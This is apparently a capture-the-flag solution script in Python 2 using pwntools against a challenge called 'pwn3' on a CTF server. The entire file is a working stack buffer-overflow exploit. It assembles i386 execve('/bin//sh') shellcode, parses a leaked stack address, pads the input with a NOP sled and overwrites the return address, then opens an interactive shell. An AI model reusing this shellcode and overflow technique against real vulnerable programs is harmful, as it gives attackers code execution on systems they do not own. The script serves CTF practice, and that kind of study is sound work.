from pwn import *


context.arch = "i386"

r = remote("pwn.ctf.tamu.edu", 4323)
# r = process("./pwn3")

# gdb.attach(r, '''set follow-fork-mode child
# b *0x08048517''')
sh = ""
sh += asm("xor eax,eax")
sh += asm("xor ecx,ecx")
sh += asm("push eax")
sh += asm("push 0x68732f2f")
sh += asm("push 0x6e69622f")
sh += asm("lea ebx,[esp]")
sh += asm("mov al,11")
sh += asm("int 0x80")
 
# sh = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
# sh += "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

r.recvuntil("Your random number ")
stack_addr = int(r.recvline().split("!")[0],16)

print "Stack Addr : {}".format(hex(stack_addr))

payload = sh + "\x90" * (242-len(sh))+ p32(stack_addr)
r.sendline(payload)
r.interactive()

